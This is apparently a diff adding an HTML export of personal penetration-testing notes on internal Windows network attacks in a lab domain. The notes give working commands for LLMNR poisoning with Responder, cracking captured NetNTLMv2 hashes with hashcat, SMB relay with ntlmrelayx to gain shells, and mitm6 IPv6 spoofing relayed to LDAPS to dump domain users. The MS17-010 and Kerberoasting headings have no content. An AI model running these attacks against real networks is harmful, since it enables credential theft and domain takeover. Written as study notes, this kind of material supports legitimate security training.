@@ -1,0 +1,55 @@
+<html><head><meta charset="utf-8" /><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor/dist/index.css"/><script src="https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor/dist/js/i18n/en_US.js"></script><script src="https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor/dist/method.min.js"></script></head><body style="width: 1075px;"><div class="vditor-reset" id="preview"><p><strong>1 Netbios &amp;&amp; LLMNR Name Poisoning</strong><br />
+<strong>2 Relay Attacks</strong><br />
+<strong>3 MITM6</strong><br />
+<strong>4 MS17-010</strong><br />
+<strong>5 Kerberoasting</strong></p>
+<hr />
+<p><strong>1. LLMNR (link local multicasting name resolution:: basically DNS) Poisoning:</strong></p>
+<ul>
+<li>
+<p>needs traffic - ideal before nmap/nessus scans</p>
+</li>
+<li>
+<p>responder:</p>
+<p><code>python /usr/share/responder/Responder.py -L eth0 -rdwv</code></p>
+<p>a) try to access attacker IP address::<img src="E:%5CUsers%5CCarl%5CDocuments%5CNotes%5CEthical%5CScreenshots%5Cadmin_malz_llmnr_poison.png" alt="llmnr_poison" /></p>
+<pre><code>hashcat -m 5600 windowshash.txt /usr/share/wordlists/rockyou.txt # --m 5600 module for NetNTLMv2
+</code></pre>
+</li>
+</ul>
+<hr />
+<p><strong>2. SMB Relay attacks:</strong></p>
+<ul>
+<li>Requirements: SMB signing must be disabled, relayed user creds must be admin on machine, &amp;&amp; network sharing enabled</li>
+<li>setup ntlmrelay:: <img src="E:%5CUsers%5CCarl%5CDocuments%5CNotes%5CEthical%5CScreenshots%5Cntlmrelay_py.png" alt="ntlmrelay.py" /><br />
+a) Find machines w/ smb enabled: Nessus or Nmap:</li>
+</ul>
+<pre><code>
+</code></pre>
+<p><code>/opt/impacket/examples/$ python3ntlmrelayx.py -tf targets.txt -smb2support (-i) #python3 -m pip install . ## -i interactive</code></p>
+<ul>
+<li>Working but keeps failing::<img src="Screenshots/revshell_smb_malz.png" alt="revmalz" /><br />
+&amp;&amp; <img src="Screenshots/malz_smb_breaking.png" alt="break" /></li>
+<li>shells W/ creds:: <img src="E:%5CUsers%5CCarl%5CDocuments%5CNotes%5CEthical%5CScreenshots%5Cmeterpreter_psexec_shells.png" alt="shells" /><br />
+<em><strong>wmiexec.py &amp;&amp; smbexec.py first! psexec and smb metepreter is very noisy</strong></em></li>
+</ul>
+<hr />
+<p><strong>3. Pv6 Attacks: DNS relay:</strong></p>
+<p><em><strong>Requirements, must have certificate in DC: manage -&gt; add role/feature -&gt; next(3x) -&gt; AD cert services -&gt; CA -&gt; next &amp;&amp; restart -&gt; install -&gt; validity period 99yrs</strong></em></p>
+<p>Setup relay &amp;&amp; ipv6 spoofing:</p>
+<ol>
+<li><code>/opt/mitm6/mitm6$ sudo python3 mitm6.py -d carbon.local #(DC) </code></li>
+<li><code>/opt/impacket/examples$ sudo python3 ntlmrelayx.py -6 -t ldaps://192.168.86.205 -wh fakewpad.carbon.local -l lootme</code></li>
+<li><code>xdg-open /opt/impacket/examples/lootme/domain_users_by_group.html</code></li>
+</ol>
+<p><img src="E:%5CUsers%5CCarl%5CDocuments%5CNotes%5CEthical%5CScreenshots%5Crelay_ipv6.png" alt="IPv6_relay" /></p>
+<hr />
+<ol start="4">
+<li>MS17-010\</li>
+</ol>
+<hr />
+<p>[tutorial] (<a href="https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa</a>)<br />
+[PW list] (<a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">https://github.com/danielmiessler/SecLists/tree/master/Passwords</a>)<br />
+[impacket] (<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a>)<br />
+[mitm6] (<a href="https://github.com/dirkjanm/mitm6)">https://github.com/dirkjanm/mitm6)</a>\</p>
+</div><script>    const previewElement = document.getElementById('preview');    Vditor.setContentTheme('idea-light', 'https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor/dist/css/content-theme');    Vditor.codeRender(previewElement);    Vditor.highlightRender({"enable":true,"lineNumber":false,"style":"dracula"}, previewElement, 'https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor');    Vditor.mathRender(previewElement, { cdn: 'https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor',math: {"engine":"KaTeX","inlineDigit":true,"macros":{}}});    Vditor.mermaidRender(previewElement, 'https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor', 'light');    Vditor.flowchartRender(previewElement, 'https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor');    Vditor.graphvizRender(previewElement, 'https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor');    Vditor.chartRender(previewElement, 'https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor', 'light');    Vditor.mindmapRender(previewElement, 'https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor', 'light');    Vditor.abcRender(previewElement, 'https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor');    Vditor.mediaRender(previewElement);    Vditor.speechRender(previewElement); </script>  <script src="https://cdn.jsdelivr.net/gh/shuzijun/markdown-editor@1.11/src/main/resources/vditor/dist/js/icons/ant.js"></script></body></html>
